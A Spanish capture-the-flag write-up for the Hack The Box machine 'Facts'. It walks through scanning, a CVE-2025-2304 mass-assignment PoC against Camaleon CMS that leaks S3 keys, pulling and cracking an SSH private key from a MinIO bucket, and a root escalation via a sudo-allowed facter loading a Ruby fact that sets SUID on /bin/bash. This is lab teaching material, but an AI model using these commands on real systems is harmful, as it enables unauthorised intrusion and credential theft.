Write-up de **Facts**, máquina Linux de Hack The Box. El camino: escalada de privilegios por mass assignment en un CMS, filtración de credenciales S3, extracción de una clave SSH cifrada desde un bucket MinIO, cracking de la passphrase y escalada final abusando de un binario con `sudo` mal restringido.

## Fase 1 — Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.244.96 -oG allPorts
nmap -sVC -p22,80,54321 -oN targeted 10.129.244.96
```

- **22**: OpenSSH 9.9p1 Ubuntu.
- **80**: nginx, redirige al vhost `facts.htb` (añadir a `/etc/hosts`).
- **54321**: MinIO (API S3), redirige a la consola en el puerto 9001 (filtrado externamente).

## Fase 2 — CVE-2025-2304: Mass Assignment en Camaleon CMS

La web en `facts.htb` es **Camaleon CMS**, con registro abierto en `/admin/register`. Tras registrarse y entrar al dashboard, el pie de página confirma la versión: **2.9.0**.

Esa versión es vulnerable a **CVE-2025-2304**, un mass assignment que permite a un usuario autenticado de bajo privilegio escalar a `admin` inyectando `password[role]=admin` contra el endpoint `updated_ajax`. El PoC usado: [CVE-2025-2304 de Alien0ne](https://github.com/Alien0ne/CVE-2025-2304), que además extrae directamente las credenciales S3 de la configuración del sitio una vez escalado.

```bash
python exploit.py -u http://facts.htb -U testing -P test -e
```

```
[+] Updated User Role: admin
[+] Extracting S3 Credentials
   s3 access key: AKIAAAC9CDD65B24A097
   s3 secret key: fgVa0o7Y1+b3k4hU9YkhLGHf/1LxkUhlF7BBaEvn
   s3 endpoint: http://localhost:54321
[+] Reverting User Role
```

## Fase 3 — MinIO: filtración de una clave SSH privada

Con las credenciales extraídas, acceso a la API S3 en el puerto 54321 (el endpoint debe apuntar a la IP/vhost externo, no a `localhost`):

```bash
AWS_ACCESS_KEY_ID="AKIAAAC9CDD65B24A097" \
AWS_SECRET_ACCESS_KEY="fgVa0o7Y1+b3k4hU9YkhLGHf/1LxkUhlF7BBaEvn" \
aws --endpoint-url http://facts.htb:54321 s3 ls
```

```
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

`randomfacts` resulta ser el almacén público de imágenes del sitio (y el destino de las subidas del CMS vía "Media", servidas estáticamente por nginx — sin ejecución de código). `internal` es el home completo de un usuario del sistema:

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
```

```
authorized_keys
id_ed25519
```

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys .
```

El resto del bucket (`.bashrc`, `.profile`, `.bundle/`, `.cache/`) no revela el usuario propietario, y `authorized_keys` no lleva comentario `usuario@host`.

> **Descartado:** la opción "Upload From URL" del CMS, intentando SSRF hacia la red interna, está bloqueada explícitamente (`Requests to the local network are not allowed`).

## Fase 4 — Cracking de la passphrase y descubrimiento del usuario

La clave privada está protegida con passphrase:

```bash
ssh2john id_ed25519 > id_ed25519.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
```

```
dragonballz      (id_ed25519)
```

Derivando la clave pública con la passphrase ya conocida se revela el usuario real, en el comentario de la clave — no era el candidato intuitivo (`camaleon`, por el nombre del CMS):

```bash
ssh-keygen -y -f id_ed25519
# ssh-ed25519 AAAAC3... trivia@facts.htb
```

## Fase 5 — Acceso SSH y pivote a william

```bash
ssh -i id_ed25519 trivia@facts.htb
# passphrase: dragonballz
id
```

Ya dentro como `trivia`, la flag de usuario no está en su propio home sino en el de otro usuario del sistema, `william`, accesible directamente desde la sesión de `trivia`:

### Flag de usuario

```bash
cat /home/william/user.txt
```

## Fase 6 — Escalada a root: sudo sobre facter

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` (la herramienta de recolección de datos de Puppet, en Ruby) acepta un directorio de scripts personalizados vía `--custom-dir`, y carga y ejecuta cualquier `.rb` que encuentre ahí. Al correr como root vía `sudo`, ese código se ejecuta con privilegios de root:

```bash
mkdir -p /tmp/facts
cat > /tmp/facts/pwn.rb << 'EOF'
Facter.add(:pwn) do
  setcode do
    system("chmod +s /bin/bash")
  end
end
EOF

sudo /usr/bin/facter --custom-dir=/tmp/facts
```

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash
```

### Flag de root

```bash
/bin/bash -p
whoami
# root
cat /root/root.txt
```
